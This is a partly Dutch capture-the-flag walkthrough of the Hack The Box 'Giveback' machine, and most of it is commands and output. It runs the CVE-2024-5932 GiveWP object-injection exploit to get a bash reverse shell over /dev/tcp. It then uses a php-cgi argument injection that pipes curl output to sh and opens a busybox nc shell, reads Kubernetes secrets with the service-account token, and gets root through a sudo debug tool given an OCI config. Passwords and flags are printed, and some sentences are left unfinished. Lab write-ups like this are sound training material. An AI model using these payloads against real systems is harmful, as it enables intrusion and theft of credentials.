# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Giveback]
└─$ nmap 10.129.50.138             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 20:07 CET
Nmap scan report for 10.129.50.138
Host is up (0.014s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp open     ssh
80/tcp filtered http
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Giveback]
└─$ nmap -p22,80 -sCV 10.129.50.138 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 20:13 CET
Nmap scan report for 10.129.50.138
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp open  http    nginx 1.28.0
|_http-generator: WordPress 6.8.1
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-server-header: nginx/1.28.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Als je gaat kijken naar de webpagina, kan je zien dat er donatie pagina is. Deze pagina noemt ....

Ik ben een exploit gaan zoeken voor de wordpress version en hierop ben ik op de volgende exploit gekomen. URL zetten + emeer uitleg https://github.com/EQSTLab/CVE-2024-5932

```
──(kali㉿kali)-[~/HTB/Giveback/CVE-2024-5932]
└─$ python CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/10.10.14.127/4444 0>&1'" 

[\] Exploit loading, please wait...
[+] Requested Data: 
{'give-form-id': '17', 'give-form-hash': '46aa65538c', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Michael', 'give_last': 'Anderson', 'give_email': 'rhall@example.org', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:52:"bash -c \'bash -i >& /dev/tcp/10.10.14.127/4444 0>&1\'";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}

┌──(kali㉿kali)-[~/HTB/Giveback]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444


Connection received on 10.129.50.138 5448
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<-5d867f47b4-fvvkn:/opt/bitnami/wordpress/wp-admin$

```

We zullen nu eens gaan kijken naar alle environment variable.. dit kan je gaan doen door gebruik te maken van het printenv commando. Ik zal gaan zoeken op de poort 5000. Dit is meestal de default poort die men gebruikt voor servers en applicaties lokaal te laten draaien.

```
<rdpress-7cc7d98d7f-jvvj8:/tmp$ printenv | grep 5000          
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
```

Ik zal nu dus in de /tmp folder een file gaan maken waarin we een rce commando zullen zetten. We gaan dan een listener en een http server gaan opzetten zodat we met het volgende commando op onze connectie op de wordpress server de connectie kunnen maken met de php server.

```
Kali machine
1. Make RCE file
   ┌──(kali㉿kali)-[~/HTB/Giveback]
└─$ cat /tmp/test 
busybox nc 10.10.16.68 8001 -e /bin/sh

2. Listener and http server
   ┌──(kali㉿kali)-[~/HTB/Giveback]
└─$ nc -lvnp 8001                  
Listening on 0.0.0.0 8001

┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 

3. On the wordpress server
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'curl 10.10.16.68:8000/test|sh']]); echo file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
```

Connection met de php-cgi

```
┌──(kali㉿kali)-[~/HTB/Giveback]
└─$ nc -lvnp 8001                  
Listening on 0.0.0.0 8001
Connection received on 10.129.51.115 30851

lsd
ls
php-cgi
```

using curl cmd read the https://kubernetes.default.svc/api/v1/namespaces/default/secrets kunnen we gaan zien hoe we het masterpassword kunnen vinden. Dit ben ik gaan doen door het volgende commando te gaan gebruiken.

```
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets

//

    ]
      },
      "data": {
        "MASTERPASS": "aU9nTTFqUm5kUlpuVHlIVWlmWGdSVGw1czd1QWV5"
      },
      "type": "Opaque"
    }
  ]
}    

//
```

you will get masterpassword at last which is on base64

```
┌──(kali㉿kali)-[~]
└─$ echo "aU9nTTFqUm5kUlpuVHlIVWlmWGdSVGw1czd1QWV5" | base64 -d
iOgM1jRndRZnTyHUifXgRTl5s7uAey                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ ssh babywyrm@giveback.htb                                                               
babywyrm@giveback.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Nov 3 18:30:39 2025 from 10.10.16.68
babywyrm@giveback:~$ 
```

User Flag

```
babywyrm@giveback:~$ cat user.txt 
f1a1048c95340487710f6d01cc429974
```

User to root

Als eerst zullen we beginnen met het 

```
babywyrm@giveback:~$ mkdir -p ~/readflag
babywyrm@giveback:~$ ls
readflag  user.txt
babywyrm@giveback:~$ cd readflag/
babywyrm@giveback:~/readflag$ mkdir rootfs
```

```
babywyrm@giveback:~/readflag$ cat > config.json << 'EOF'
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/cat", "/root/root.txt"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/dev", "type": "tmpfs", "source": "tmpfs", "options": ["nosuid","strictatime","mode=755","size=65536k"]},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
    {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","ro"]},
    {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["bind","ro"]}
  ],
  "linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"}
    ]
  }
}
EOF
```
De admin password zal het password van de maria-db zijn maar je zal hem base64 moeten maken: c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T

```
babywyrm@giveback:~/readflag$ sudo /opt/debug run getflag
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
fc174e92b723d301aa0b98292403d924
```
